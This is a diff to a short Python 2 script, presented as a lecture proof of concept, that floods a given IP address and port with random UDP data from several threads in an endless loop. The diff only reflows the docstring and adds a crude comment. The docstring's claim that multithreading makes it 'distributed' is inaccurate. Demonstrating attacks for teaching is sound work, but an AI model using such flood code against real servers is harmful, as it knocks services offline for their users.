@@ -1,7 +1,9 @@
 '''
 Program as a proof of concept for the ISSS Lecture on Denial of service atttacks
 
-This program takes 2 command line arguments. The first is an ip-address and the second is a port. It then runs 4 threads that send large amount of bits to the desired server with the desired port. Because it runs on multiple threads, this program is considered a Distributed Denial of Service
+This program takes 2 command line arguments. The first is an ip-address and the second is a port. 
+It then runs 4 threads that send large amount of bits to the desired server with the desired port. 
+Because it runs on multiple threads, this program is considered a Distributed Denial of Service
 
 This program is not intended to be used maliciously, rather to demonstrate how easy it is to create a denial of service attack
 '''
@@ -20,6 +22,7 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 # Method to send the data with given ip address and port
 def send_data (thread_name, ip_address, port):
 	print "Starting " + thread_name
+	# Run for fucking ever
 	while (True):
 		# Create random data and send it
 		bits = random.getrandbits(N_BITS)
